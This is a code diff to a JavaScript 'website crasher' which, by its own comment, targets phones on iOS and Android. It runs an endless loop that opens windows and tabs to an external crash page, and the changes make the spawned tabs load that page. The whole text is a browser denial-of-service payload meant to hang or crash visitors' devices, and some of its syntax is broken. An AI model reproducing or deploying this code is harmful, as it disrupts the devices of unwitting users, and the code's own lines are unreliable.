@@ -8,7 +8,7 @@ while(1) {
     /* (Website Crasher For IOS and android And Mostly Every Phone) */
         window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck';
         // if window.open fails.
-        $x = Math.floor((Math.random() * 100) + 1);
+        $x = Math.floor((Math.random() * 10000000000000000000) + 1);
         document.open('#' + $x);
         // When Function window.open does it's thing, history back will reset the website.
 
@@ -19,7 +19,7 @@ while(1) {
         
         // if (Document.open()) Fails.
         let newTab = window.open();
-        newTab.location.href = '#' + $x;
+        newTab.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/' + $x;
         
     }
 }
